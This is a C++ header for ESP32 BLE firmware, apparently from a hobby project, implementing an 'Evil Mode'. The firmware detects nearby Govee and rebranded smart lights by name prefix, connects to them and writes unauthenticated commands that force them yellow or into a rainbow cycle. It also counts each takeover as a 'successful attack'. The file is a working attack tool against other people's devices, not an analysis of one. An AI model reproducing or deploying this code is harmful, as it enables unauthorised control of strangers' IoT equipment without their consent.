#ifndef EVIL_MODE_H
#define EVIL_MODE_H

#include <NimBLEDevice.h>
#include <Arduino.h>

#include "infrastructure/logging/logger.h"


// ===========================================================================
//  Evil Mode (Govee Chaos)
//  Detects Govee BLE devices and sends yellow color commands (Nibbles color!)
// ===========================================================================

namespace EvilMode {

// Govee BLE UUIDs
constexpr const char* GOVEE_CONTROL_UUID  = "00010203-0405-0607-0809-0a0b0c0d2b11";
constexpr const char* GOVEE_SERVICE_UUID  = "00010203-0405-0607-0809-0a0b0c0d1910";

// Yellow color command (Nibbles yellow: #FFEB3B)
// Format: [0x33, 0x05, 0x04, R, G, B, 0x00, ... padding ...]
static const uint8_t YELLOW_CMD[] = {
    0x33, 0x05, 0x04,           // Command header
    0xFF, 0xEB, 0x3B,           // RGB: Nibbles Yellow (#FFEB3B)
    0x00, 0x00, 0x00, 0x00,     // Padding
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00                  
};

// Alternative command patterns
static const uint8_t ALT_YELLOW_CMD_1[] = {
    0xAA, 0x05, 0x04,           
    0xFF, 0xEB, 0x3B,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00
};

static const uint8_t ALT_YELLOW_CMD_2[] = {
    0x33, 0x33, 0x05, 0x04,     
    0xFF, 0xEB, 0x3B,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00
};

// Rainbow cycle command (bonus!)
static const uint8_t RAINBOW_CMD[] = {
    0x33, 0x05, 0x05,           
    0x01,                       
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00
};

// Statistics
struct EvilStats {
    uint16_t goveeDevicesFound = 0;
    uint16_t successfulAttacks = 0;
    uint16_t failedAttacks     = 0;
    uint32_t lastAttackTime    = 0;
};

extern EvilStats stats;

// ===========================================================================
//  Detection Functions
// ===========================================================================

/**
 * Check if device name is a Govee device
 */
inline bool isGoveeDevice(const String& name) {
    if (name.isEmpty()) return false;
    
    // Primary Govee identifiers
    if (name.startsWith("Govee_"))     return true;
    if (name.startsWith("GV"))         return true;
    if (name.startsWith("H6"))         return true;
    
    // Rebrand identifiers (same protocol)
    if (name.startsWith("ihoment_"))   return true;
    if (name.startsWith("Minger_"))    return true;
    if (name.startsWith("Ledenet_"))   return true;
    
    return false;
}

/**
 * Check if connected client has Govee service
 */
inline bool hasGoveeService(NimBLEClient* pClient) {
    if (!pClient || !pClient->isConnected()) return false;
    
    NimBLERemoteService* pService = pClient->getService(GOVEE_SERVICE_UUID);
    if (pService) {
        NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(GOVEE_CONTROL_UUID);
        return (pChar != nullptr);
    }
    
    return false;
}

// ===========================================================================
//  Attack Functions
// ===========================================================================

/**
 * Send yellow command to Govee device
 * Returns true on success
 */
inline bool sendYellowCommand(NimBLEClient* pClient, const String& devTag) {
    if (!pClient || !pClient->isConnected()) {
        LOG(LOG_TARGET, devTag + "Evil Mode: Client not connected");
        return false;
    }
    
    LOG(LOG_TARGET, devTag + "💛 EVIL MODE: Sending Nibbles Yellow...");
    
    // Get Govee service
    NimBLERemoteService* pService = pClient->getService(GOVEE_SERVICE_UUID);
    if (!pService) {
        LOG(LOG_TARGET, devTag + "Evil Mode: Govee service not found");
        return false;
    }
    
    // Get control characteristic
    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(GOVEE_CONTROL_UUID);
    if (!pChar) {
        LOG(LOG_TARGET, devTag + "Evil Mode: Control characteristic not found");
        return false;
    }
    
    // Try main command
    try {
        pChar->writeValue((uint8_t*)YELLOW_CMD, sizeof(YELLOW_CMD), false);
        LOG(LOG_TARGET, devTag + "💛 SUCCESS! Govee turned YELLOW!");
        stats.successfulAttacks++;
        stats.lastAttackTime = millis();
        return true;
    } catch (...) {
        LOG(LOG_TARGET, devTag + "Evil Mode: Main command failed, trying alternatives...");
    }
    
    // Try alternative 1
    try {
        pChar->writeValue((uint8_t*)ALT_YELLOW_CMD_1, sizeof(ALT_YELLOW_CMD_1), false);
        LOG(LOG_TARGET, devTag + "💛 SUCCESS (alt 1)! Govee turned YELLOW!");
        stats.successfulAttacks++;
        stats.lastAttackTime = millis();
        return true;
    } catch (...) {
        // Continue
    }
    
    // Try alternative 2
    try {
        pChar->writeValue((uint8_t*)ALT_YELLOW_CMD_2, sizeof(ALT_YELLOW_CMD_2), false);
        LOG(LOG_TARGET, devTag + "💛 SUCCESS (alt 2)! Govee turned YELLOW!");
        stats.successfulAttacks++;
        stats.lastAttackTime = millis();
        return true;
    } catch (...) {
        LOG(LOG_TARGET, devTag + "❌ Evil Mode: All yellow commands failed");
        stats.failedAttacks++;
        return false;
    }
}

/**
 * Send rainbow command
 */
inline bool sendRainbowCommand(NimBLEClient* pClient, const String& devTag) {
    if (!pClient || !pClient->isConnected()) return false;
    
    LOG(LOG_TARGET, devTag + "🌈 EVIL MODE: Activating rainbow...");
    
    NimBLERemoteService* pService = pClient->getService(GOVEE_SERVICE_UUID);
    if (!pService) return false;
    
    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(GOVEE_CONTROL_UUID);
    if (!pChar) return false;
    
    try {
        pChar->writeValue((uint8_t*)RAINBOW_CMD, sizeof(RAINBOW_CMD), false);
        LOG(LOG_TARGET, devTag + "🌈 Rainbow activated!");
        stats.successfulAttacks++;
        stats.lastAttackTime = millis();
        return true;
    } catch (...) {
        LOG(LOG_TARGET, devTag + "❌ Rainbow command failed");
        stats.failedAttacks++;
        return false;
    }
}

/**
 * Execute evil mode attack on connected Govee device
 * Tries yellow first, then rainbow as fallback
 */
inline bool executeAttack(NimBLEClient* pClient, const String& devTag) {
    stats.goveeDevicesFound++;
    
    if (sendYellowCommand(pClient, devTag)) {
        return true;
    }
    
    // Fallback to rainbow
    LOG(LOG_TARGET, devTag + "Trying rainbow as fallback...");
    return sendRainbowCommand(pClient, devTag);
}

/**
 * Get statistics as formatted string
 */
inline String getStatsString() {
    String s = "😈 EVIL MODE STATS:\n";
    s += "   Govee found:    " + String(stats.goveeDevicesFound) + "\n";
    s += "   Successful:     " + String(stats.successfulAttacks) + "\n";
    s += "   Failed:         " + String(stats.failedAttacks) + "\n";
    
    if (stats.lastAttackTime > 0) {
        s += "   Last attack:    " + String((millis() - stats.lastAttackTime) / 1000) + "s ago";
    }
    
    return s;
}

/**
 * Reset statistics
 */
inline void resetStats() {
    stats.goveeDevicesFound = 0;
    stats.successfulAttacks = 0;
    stats.failedAttacks     = 0;
    stats.lastAttackTime    = 0;
}

} // namespace EvilMode

#endif // EVIL_MODE_H
